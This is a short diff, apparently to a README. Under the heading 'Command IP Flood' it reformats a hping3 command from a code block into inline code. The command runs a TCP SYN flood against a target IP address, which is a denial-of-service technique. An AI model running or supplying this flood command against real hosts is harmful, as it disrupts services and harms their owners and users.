@@ -14,6 +14,5 @@
         <img src="static/images/website.png" width="500">
     </p>
 <h2 align="center">Command IP Flood</h1>
-```sh
-sudo hping3 -S --flood -p 1000 <IP Target>
-```
+`sudo hping3 -S --flood -p 1000 <IP Target>`
+
